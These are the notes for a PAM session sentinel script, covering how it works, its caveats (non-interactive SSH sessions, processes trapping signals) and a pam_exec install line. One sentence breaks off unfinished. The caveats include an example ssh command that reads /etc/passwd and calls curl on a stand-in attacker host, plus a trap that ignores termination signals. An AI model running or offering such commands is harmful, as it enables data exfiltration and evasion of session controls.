NOTES
=====

How it works
------------

The script detaches itself from PAM's execution thread. 
PAM does its checks and hands control over to the user's shell.
In the meanwhile the script counts down silently in the background. 
If the timer runs out, the sentinel performs its check and if this fails 

Ansible
-------

Use a dedicated ansible user.


Caveats
-------

```sh
ssh user@server "cat /etc/passwd && curl http://attacker.com/leak"
# There is no interactive shell to log out of. The SSH daemon spawns the process directly, executes the string, and closes.
```

**SIGHUP** or **SIGTERM** may be trapped and ignored.
**SIGKILL** is the only signal in Linux that cannot be caught, blocked, or ignored by a process. 
The moment the kernel sees a kill -9, it doesn't ask the process to close - it immediately wipes the process out of system memory.

But it brings the risk of data corruption.

```sh
trap "echo I am not leaving" SIGHUP SIGTERM
```

Install
-------

```sh
# /etc/pam.d/common-session
# at the bottom:
session optional pam_exec.so /usr/local/bin/pam_sentinel.sh
```